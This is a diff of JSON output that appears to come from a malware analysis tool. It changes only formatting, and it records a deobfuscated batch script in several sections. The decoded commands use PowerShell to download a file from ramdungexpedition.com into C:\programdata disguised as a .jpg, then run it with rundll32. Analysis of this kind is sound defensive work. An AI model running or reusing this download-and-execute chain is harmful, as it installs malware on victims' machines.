@@ -5,7 +5,20 @@
     "sections": [
       {
         "auto_collapse": false,
-        "body": "[{\"Command [trunc]\": \"%rfptoz%%iwqnoh%%kmbflw%%gkboij%%jsmwxd%%jseful%%dpgaru%%gkboij%%hcbszt%%hcbszt% %knfogq%%tnkoyi%%hm\", \"Normalized [trunc]\": \"powershell invoke-webrequest -uri https://ramdungexpedition.com/image/017.gif -outfile c:\\\\programdat\"}, {\"Command [trunc]\": \"%jsmwxd%%mhilqc%%tnkoyi%%xoygqw%%hcbszt%%hcbszt%32 %ptjeix%:\\\\%rfptoz%%jsmwxd%%iwqnoh%%ujkpla%%jsmwxd\", \"Normalized\": \"rundll32 c:\\\\programdata\\\\PNwK.jpg init\"}, {\"Command\": \"%gkboij%%yrukzs%%knfogq%%vxojht%\", \"Normalized\": \"exit\"}]",
+        "body": [
+          {
+            "Command [trunc]": "%rfptoz%%iwqnoh%%kmbflw%%gkboij%%jsmwxd%%jseful%%dpgaru%%gkboij%%hcbszt%%hcbszt% %knfogq%%tnkoyi%%hm",
+            "Normalized [trunc]": "powershell invoke-webrequest -uri https://ramdungexpedition.com/image/017.gif -outfile c:\\programdat"
+          },
+          {
+            "Command [trunc]": "%jsmwxd%%mhilqc%%tnkoyi%%xoygqw%%hcbszt%%hcbszt%32 %ptjeix%:\\%rfptoz%%jsmwxd%%iwqnoh%%ujkpla%%jsmwxd",
+            "Normalized": "rundll32 c:\\programdata\\PNwK.jpg init"
+          },
+          {
+            "Command": "%gkboij%%yrukzs%%knfogq%%vxojht%",
+            "Normalized": "exit"
+          }
+        ],
         "body_config": {
           "column_order": [
             "Command",
@@ -23,13 +36,25 @@
           "score_map": {},
           "signatures": {}
         },
+        "promote_to": null,
         "tags": {},
         "title_text": "Execution of variable content",
         "zeroize_on_tag_safe": false
       },
       {
         "auto_collapse": false,
-        "body": "[{\"Count\": 85, \"Command [trunc]\": \"%rfptoz%%iwqnoh%%kmbflw%%gkboij%%jsmwxd%%jseful%%dpgaru%%gkboij%%hcbszt%%hcbszt% %knfogq%%tnkoyi%%hm\", \"Normalized [trunc]\": \"powershell invoke-webrequest -uri https://ramdungexpedition.com/image/017.gif -outfile c:\\\\programdat\"}, {\"Count\": 26, \"Command [trunc]\": \"%jsmwxd%%mhilqc%%tnkoyi%%xoygqw%%hcbszt%%hcbszt%32 %ptjeix%:\\\\%rfptoz%%jsmwxd%%iwqnoh%%ujkpla%%jsmwxd\", \"Normalized\": \"rundll32 c:\\\\programdata\\\\PNwK.jpg init\"}]",
+        "body": [
+          {
+            "Command [trunc]": "%rfptoz%%iwqnoh%%kmbflw%%gkboij%%jsmwxd%%jseful%%dpgaru%%gkboij%%hcbszt%%hcbszt% %knfogq%%tnkoyi%%hm",
+            "Count": 85,
+            "Normalized [trunc]": "powershell invoke-webrequest -uri https://ramdungexpedition.com/image/017.gif -outfile c:\\programdat"
+          },
+          {
+            "Command [trunc]": "%jsmwxd%%mhilqc%%tnkoyi%%xoygqw%%hcbszt%%hcbszt%32 %ptjeix%:\\%rfptoz%%jsmwxd%%iwqnoh%%ujkpla%%jsmwxd",
+            "Count": 26,
+            "Normalized": "rundll32 c:\\programdata\\PNwK.jpg init"
+          }
+        ],
         "body_config": {
           "column_order": [
             "Count",
@@ -48,13 +73,20 @@
           "score_map": {},
           "signatures": {}
         },
+        "promote_to": null,
         "tags": {},
         "title_text": "Multiple variable were used on the same line",
         "zeroize_on_tag_safe": false
       },
       {
         "auto_collapse": false,
-        "body": "[{\"URL\": \"https://ramdungexpedition.com/image/017.gif\", \"Destination\": \"c:\\\\programdata\\\\PNwK.jpg\", \"Command [trunc]\": \"powershell.exe  invoke-webrequest -uri https://ramdungexpedition.com/image/017.gif -outfile c:\\\\progr\"}]",
+        "body": [
+          {
+            "Command [trunc]": "powershell.exe  invoke-webrequest -uri https://ramdungexpedition.com/image/017.gif -outfile c:\\progr",
+            "Destination": "c:\\programdata\\PNwK.jpg",
+            "URL": "https://ramdungexpedition.com/image/017.gif"
+          }
+        ],
         "body_config": {
           "column_order": [
             "URL",
@@ -73,6 +105,7 @@
           "score_map": {},
           "signatures": {}
         },
+        "promote_to": null,
         "tags": {
           "dynamic": {
             "process": {
@@ -121,6 +154,7 @@
             "downloads_file_to_programdata": 1
           }
         },
+        "promote_to": null,
         "tags": {
           "file": {
             "path": [
@@ -146,7 +180,22 @@
       },
       {
         "auto_collapse": false,
-        "body": "[[\"TABLE\", [{\"Command\": \"rundll32 c:\\\\programdata\\\\PNwK.jpg init\"}], {}], [\"TEXT\", \"c:\\\\programdata\\\\PNwK.jpg was downloaded from https://ramdungexpedition.com/image/017.gif\", {}]]",
+        "body": [
+          [
+            "TABLE",
+            [
+              {
+                "Command": "rundll32 c:\\programdata\\PNwK.jpg init"
+              }
+            ],
+            {}
+          ],
+          [
+            "TEXT",
+            "c:\\programdata\\PNwK.jpg was downloaded from https://ramdungexpedition.com/image/017.gif",
+            {}
+          ]
+        ],
         "body_config": {},
         "body_format": "MULTI",
         "classification": "TLP:C",
@@ -161,6 +210,7 @@
             "internet_download": 1
           }
         },
+        "promote_to": null,
         "tags": {
           "dynamic": {
             "process": {
